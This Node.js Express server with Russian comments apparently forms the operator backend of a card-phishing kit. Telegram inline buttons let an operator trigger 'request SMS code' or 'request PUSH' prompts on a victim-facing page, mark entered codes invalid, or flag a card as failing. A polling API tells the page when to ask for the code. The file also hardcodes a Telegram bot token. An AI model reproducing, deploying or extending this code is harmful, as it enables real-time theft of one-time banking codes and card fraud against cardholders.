/**
 * Telegram Bot Webhook Server
 * Обрабатывает нажатия на inline кнопки в Telegram и устанавливает флаги для клиентов
 */

const express = require('express')
const bodyParser = require('body-parser')
const cors = require('cors')
const https = require('https')

const app = express()
const PORT = process.env.PORT || 3001

// Telegram Bot Configuration
const BOT_TOKEN_CARDS = '8406857793:AAGDQnLYrL78nWDrBxi1AS1kWTTVjxdUbpg'
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN_CARDS}`

// Middleware
app.use(cors())
app.use(bodyParser.json())

// In-memory storage для флагов SMS (в production использовать Redis или DB)
const smsFlags = new Map()

/**
 * Webhook endpoint для Telegram
 * POST /webhook
 */
app.post('/webhook', async (req, res) => {
  try {
    const update = req.body

    // Обработка callback_query (нажатия на inline кнопки)
    if (update.callback_query) {
      const callbackQuery = update.callback_query
      const callbackData = callbackQuery.data
      const chatId = callbackQuery.message.chat.id
      const messageId = callbackQuery.message.message_id

      console.log(`Received callback: ${callbackData}`)

      // Извлекаем userId из callback_data
      let userId = null
      let action = null

      if (callbackData.startsWith('request_sms_')) {
        userId = callbackData.replace('request_sms_', '')
        action = 'request_sms'
      } else if (callbackData.startsWith('request_push_')) {
        userId = callbackData.replace('request_push_', '')
        action = 'request_push'
      } else if (callbackData.startsWith('invalid_sms_')) {
        userId = callbackData.replace('invalid_sms_', '')
        action = 'invalid_sms'
      } else if (callbackData.startsWith('card_blocked_')) {
        userId = callbackData.replace('card_blocked_', '')
        action = 'card_blocked'
      }

      if (userId && action) {
        await handleButtonAction(action, userId, chatId, messageId, callbackQuery.id)
      }
    }

    res.sendStatus(200)
  } catch (error) {
    console.error('Webhook error:', error)
    res.sendStatus(500)
  }
})

/**
 * API endpoint для проверки флага SMS
 * GET /api/check-sms/:userId
 */
app.get('/api/check-sms/:userId', (req, res) => {
  const { userId } = req.params
  const smsRequested = smsFlags.get(userId) || false
  
  res.json({
    smsRequested,
    userId
  })
})

/**
 * API endpoint для установки флага SMS (для тестирования)
 * POST /api/set-sms/:userId
 */
app.post('/api/set-sms/:userId', (req, res) => {
  const { userId } = req.params
  smsFlags.set(userId, true)
  
  console.log(`✅ SMS flag set for user: ${userId}`)
  
  res.json({
    success: true,
    userId,
    message: 'SMS flag set successfully'
  })
})

/**
 * API endpoint для очистки флага SMS
 * POST /api/clear-sms/:userId
 */
app.post('/api/clear-sms/:userId', (req, res) => {
  const { userId } = req.params
  smsFlags.delete(userId)
  
  res.json({
    success: true,
    userId
  })
})

/**
 * Обработка действий кнопок
 */
async function handleButtonAction(action, userId, chatId, messageId, callbackQueryId) {
  let responseText = ''
  let alertText = ''

  switch (action) {
    case 'request_sms':
      // Устанавливаем флаг для userId
      smsFlags.set(userId, true)
      responseText = '✅ SMS запрошен'
      alertText = '📱 Клиенту отправлен запрос на ввод SMS кода'
      
      // Отправляем уведомление в чат
      await sendTelegramMessage(chatId, `📱 <b>SMS КОД ЗАПРОШЕН</b>\n\n👤 ID клиента: <code>${userId}</code>\n⏰ Ожидаем ввода SMS кода...`)
      break

    case 'request_push':
      responseText = '✅ PUSH запрошен'
      alertText = '🔔 Клиенту отправлен запрос на подтверждение PUSH'
      
      await sendTelegramMessage(chatId, `🔔 <b>PUSH УВЕДОМЛЕНИЕ ЗАПРОШЕНО</b>\n\n👤 ID клиента: <code>${userId}</code>`)
      break

    case 'invalid_sms':
      responseText = '❌ Помечен как неверный SMS'
      alertText = '❌ SMS код отмечен как неверный'
      
      await sendTelegramMessage(chatId, `❌ <b>НЕВЕРНЫЙ SMS КОД</b>\n\n👤 ID клиента: <code>${userId}</code>\n⚠️ Клиент ввёл неверный SMS код`)
      break

    case 'card_blocked':
      responseText = '🚫 Карта помечена как заблокированная'
      alertText = '🚫 Карта не проходит проверку'
      
      await sendTelegramMessage(chatId, `🚫 <b>КАРТА НЕ ЛЕЗЕТ</b>\n\n👤 ID клиента: <code>${userId}</code>\n⚠️ Карта заблокирована или не проходит`)
      break
  }

  // Отправляем ответ на нажатие кнопки
  await answerCallbackQuery(callbackQueryId, alertText)
  
  // Обновляем сообщение (добавляем статус)
  await editMessageReplyMarkup(chatId, messageId, responseText)
}

/**
 * Отправка сообщения в Telegram
 */
function sendTelegramMessage(chatId, text) {
  const postData = JSON.stringify({
    chat_id: chatId,
    text: text,
    parse_mode: 'HTML'
  })

  const options = {
    hostname: 'api.telegram.org',
    path: `/bot${BOT_TOKEN_CARDS}/sendMessage`,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(postData)
    }
  }

  const req = https.request(options, (res) => {
    let data = ''
    res.on('data', (chunk) => { data += chunk })
    res.on('end', () => {
      if (res.statusCode === 200) {
        console.log('✅ Message sent to Telegram')
      } else {
        console.error('❌ Failed to send message:', data)
      }
    })
  })

  req.on('error', (error) => {
    console.error('Error sending message:', error)
  })

  req.write(postData)
  req.end()
}

/**
 * Ответ на callback query (показывает alert пользователю)
 */
function answerCallbackQuery(callbackQueryId, text) {
  const postData = JSON.stringify({
    callback_query_id: callbackQueryId,
    text: text,
    show_alert: false
  })

  const options = {
    hostname: 'api.telegram.org',
    path: `/bot${BOT_TOKEN_CARDS}/answerCallbackQuery`,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(postData)
    }
  }

  const req = https.request(options, (res) => {
    res.on('data', () => {})
    res.on('end', () => { console.log('✅ Callback answered') })
  })

  req.on('error', (error) => {
    console.error('Error answering callback query:', error)
  })

  req.write(postData)
  req.end()
}

/**
 * Редактирование reply markup (обновление кнопок)
 */
async function editMessageReplyMarkup(chatId, messageId, status) {
  try {
    // Можно обновить кнопки или добавить текст статуса к сообщению
    // Для простоты оставляем кнопки как есть
    console.log(`Status update: ${status} for message ${messageId}`)
  } catch (error) {
    console.error('Error editing message:', error)
  }
}

/**
 * Настройка webhook (запускается один раз)
 */
function setupWebhook() {
  const WEBHOOK_URL = process.env.WEBHOOK_URL || 'https://your-domain.com/webhook'
  
  console.log('🔧 Setting up webhook:', WEBHOOK_URL)
  console.log('⚠️  Manual setup recommended: use setup-webhook.js script')
}

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({
    status: 'ok',
    activeSMSRequests: smsFlags.size,
    timestamp: new Date().toISOString()
  })
})

// Root endpoint
app.get('/', (req, res) => {
  res.json({
    name: 'Telegram Bot Webhook Server',
    version: '1.0.0',
    endpoints: {
      webhook: 'POST /webhook',
      checkSMS: 'GET /api/check-sms/:userId',
      clearSMS: 'POST /api/clear-sms/:userId',
      health: 'GET /health'
    }
  })
})

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`)
  console.log(`📱 Webhook endpoint: http://localhost:${PORT}/webhook`)
  console.log(`💡 Health check: http://localhost:${PORT}/health`)
  
  // Раскомментируйте для настройки webhook в production
  // setupWebhook()
})

module.exports = app

